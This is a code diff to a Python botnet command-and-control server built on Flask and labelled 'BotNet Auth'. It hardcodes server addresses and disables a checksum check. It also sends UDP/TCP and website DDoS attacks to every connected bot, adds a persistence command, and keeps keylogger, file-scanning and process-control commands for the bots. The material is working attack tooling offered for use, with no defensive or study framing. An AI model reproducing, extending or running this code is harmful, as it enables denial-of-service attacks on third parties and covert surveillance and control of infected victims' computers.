@@ -9,6 +9,8 @@ import threading
 import subprocess
 import json as jsond 
 
+from concurrent.futures.thread import ThreadPoolExecutor
+from turtle import xcor
 from typing import Tuple
 from uuid import uuid4  
 from time import sleep
@@ -28,8 +30,8 @@ from tkinter import *
 from flask import *
 
 # Server info
-ippp      	= "IP_HERE" 			# IP_HERE
-port_    	= "PORT_HERE"			# PORT_HERE
+ippp      	= "192.168.0.2" 			# IP_HERE
+port_    	= "1888"			# PORT_HERE
 port   		= int(port_)
 
 #region Keyauth
@@ -123,9 +125,8 @@ class api:
 
         if json["success"]:
             self.__load_user_data(json["info"])
-            sleep(2)
             return "logged in"
-        else: sleep(2) ; return str(json["message"])
+        else: return str(json["message"])
 
     def license(self, key, hwid=None):
         self.checkinit()
@@ -179,7 +180,6 @@ class api:
             return json["message"]
         else:
             print(json["message"])
-            sleep(5)
             sys.exit()
 
     def getvar(self, var_name):
@@ -202,7 +202,6 @@ class api:
             return json["response"]
         else:
             print(json["message"])
-            sleep(5)
             sys.exit()
 
     def setvar(self, var_name, var_data):
@@ -225,7 +224,6 @@ class api:
             return True
         else:
             print(json["message"])
-            sleep(5)
             sys.exit()    
 
     def ban(self):
@@ -246,7 +244,6 @@ class api:
             return True
         else:
             print(json["message"])
-            sleep(5)
             sys.exit()    
 
     def file(self, fileid):
@@ -457,13 +454,13 @@ class encryption:
 
 def getchecksum():
 	path = os.path.basename(__file__)
-	if not os.path.exists(path): path = path[:-2] + "py"
-	md5_hash = hashlib.md5()
-	a_file = open(path,"rb")
-	content = a_file.read()
-	md5_hash.update(content)
-	digest = md5_hash.hexdigest()
-	return digest
+	# if not os.path.exists(path): path = path[:-2] + "py"
+	# md5_hash = hashlib.md5()
+	# a_file = open(path,"rb")
+	# content = a_file.read()
+	# md5_hash.update(content)
+	# digest = md5_hash.hexdigest()
+	return path
 
 keyauthapp = api(
     name = "BotNet Auth",
@@ -513,6 +510,7 @@ idNum       	= 0		# Bot ID number
 database    	= []	# list of all clients
 out 			= ""	# Command output
 shell_out 	    = ""	# Shell Command output
+maxWorkers		= 500	# Max number of workers
 
 temp 			= os.getenv('temp')
 stop 			= False	
@@ -705,12 +703,6 @@ def _take_cmd(bot, cmd):
 	elif "stress" in cmd:
 		return call_script(bot, cmd)
 	
-	elif "ddos" in cmd:
-		return call_script(bot, cmd)
-
-	elif "attack" in cmd:
-		return call_script(bot, cmd)
-
 	elif "keylogger" in cmd:
 		return call_script(bot, cmd)
 	
@@ -721,6 +713,9 @@ def _take_cmd(bot, cmd):
 		return call_script(bot, cmd)
 
 	elif "scanfiles" in cmd:
+		return call_script(bot, cmd)
+
+	elif "persistance" in cmd:
 		return call_script(bot, cmd)
 
 	else: return(f"Error: {cmd} is not a valid command")
@@ -739,21 +734,6 @@ def command_check(command):
 		stress_time 	= request.form.get('stress-time')
 		stress_amount 	= request.form.get('stress-tasks')
 		return (f'{command} {stress_time} {stress_amount}')
-
-	elif command == "ddos": 
-		ddos_method 	= request.form.get('ddos-website-method')
-		ddos_target 	= request.form.get('ddos-website-target')
-		ddos_time	 	= request.form.get('ddos-website-time')
-		ddos_thread 	= request.form.get('ddos-website-thread')
-		return (f'{command} {ddos_method} {ddos_target} {ddos_thread} {ddos_time}')
-
-	elif command == "attack": 
-		ddos_method 	= request.form.get('ddos-ip-method')
-		ddos_target 	= request.form.get('ddos-ip-target')
-		ddos_port 		= request.form.get('ddos-ip-port')
-		ddos_time	 	= request.form.get('ddos-ip-time')
-		ddos_thread 	= request.form.get('ddos-ip-thread')
-		return (f'{command} {ddos_method} {ddos_target} {ddos_port} {ddos_thread} {ddos_time}')
 
 	elif command == "keylogger":
 		keylogger_intervals 		= request.form.get('keylogger-intervals')
@@ -777,6 +757,10 @@ def command_check(command):
 	elif command == "processcontrol":
 		process_names 	= request.form.get('process-names')
 		return (f'{command} {process_names}')
+
+	elif command == "persistance":
+		persistance_name = request.form.get('persistance-name')
+		return (f'{command} {persistance_name}')
 
 	else: return command
 #endregion
@@ -839,17 +823,83 @@ def sendcommands():
 				idNumber = request.form.get('idNumber')
 				command_ = request.form.get('command-selection')
 				command = ""
-				command += str(command_check(str(command_)))
-
-				print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))
 
 				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', out=out)
 
-				if command == "clear":
+				if command_ == "clear":
 					out = "" # clear output
 					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
+
 				
+				elif command_ == "attack": 
+					xx = 0
+					ddos_method 	= str(request.form.get('ddos-ip-method')).lower()
+					ddos_target 	= request.form.get('ddos-ip-target')
+					ddos_port 		= request.form.get('ddos-ip-port')
+					ddos_time	 	= request.form.get('ddos-ip-time')
+					ddos_thread 	= request.form.get('ddos-ip-thread')
+					if ddos_method == "udp" or ddos_method == "tcp": 
+						try: 
+							for x in database:
+								with ThreadPoolExecutor(max_workers=500) as executor:
+									executor.submit(call_script(xx, str(command))) ; xx+=1
+
+							out += "\n\n" + f"""Attack sent successfully
+
+
+    -------Attack Infomation-------
+
+    IP:             \t{ddos_target}
+    Port:           \t{ddos_port}
+    Bots Amount:    \t{xx}
+    Attack Time:    \t{ddos_time}s
+    Attack Method:  \t{ddos_method}
+    Thread Amount:  \t{ddos_thread}
+"""
+
+							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+
+						except Exception as e: 
+							print_debug("Error while sending command: " + str(e))
+							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+					
+					else: out += f"Invalid Attack Method: {ddos_method}"
+
+				elif command_ == "ddos": 
+					xx = 0
+					ddos_method 	= str(request.form.get('ddos-website-method')).lower()
+					ddos_target 	= request.form.get('ddos-website-target')
+					ddos_time	 	= request.form.get('ddos-website-time')
+					ddos_thread 	= request.form.get('ddos-website-thread')
+					if ddos_method == "cfb" or ddos_method == "pxcfb" or ddos_method == "cfreq" or ddos_method == "cfsoc": 
+						try:
+							for x in database:
+								with ThreadPoolExecutor(max_workers=500) as executor:
+									executor.submit(call_script(xx, str(command))) ; xx+=1
+
+							out += "\n\n" + f"""Attack sent successfully
+
+
+    -------Attack Infomation-------
+
+    Target:         \t{ddos_target}
+    Bots Amount:    \t{xx}
+    Attack Time:    \t{ddos_time}s
+    Attack Method:  \t{ddos_method}
+    Thread Amount:  \t{ddos_thread}
+"""
+							
+							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+						
+						except Exception as e: 
+							print_debug("Error while sending command: " + str(e))
+							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+					
+					else: out += f"Invalid Attack Method: {ddos_method}" ; return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+
 				else:
+					command += str(command_check(str(command_)))
+					print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))
 					for x in database:
 						if str(x.idNum) == str(idNumber):
 							try: 
@@ -859,6 +909,7 @@ def sendcommands():
 								print_debug("Error while sending command" + str(e))
 								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 					return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
+			
 			else: return render_template('sendcommands.html', commandOutput=out)
 
 	except Exception as e:
@@ -945,7 +996,7 @@ if __name__ == '__main__':
 	if platform.system() == "Windows":
 		threading.Thread(target=last_online).start() ; threading.Thread(target=map_update).start()
 		if _bind((ippp, port)): print_debug(f'Botnet server started on {ippp}:{port}')
-		pppp = "HOSTPORTHERE" ; pp = int(pppp) # HOSTPORTHERE
-		socketio.run(app.run(host="HOSTIPHERE", port=pp)) # HOSTIPHERE
+		pppp = "1666" ; pp = int(pppp) # HOSTPORTHERE
+		socketio.run(app.run(host="192.168.0.2", port=pp)) # HOSTIPHERE
 
 	else: print("This program is only compatible with Windows") ; os._exit(1)
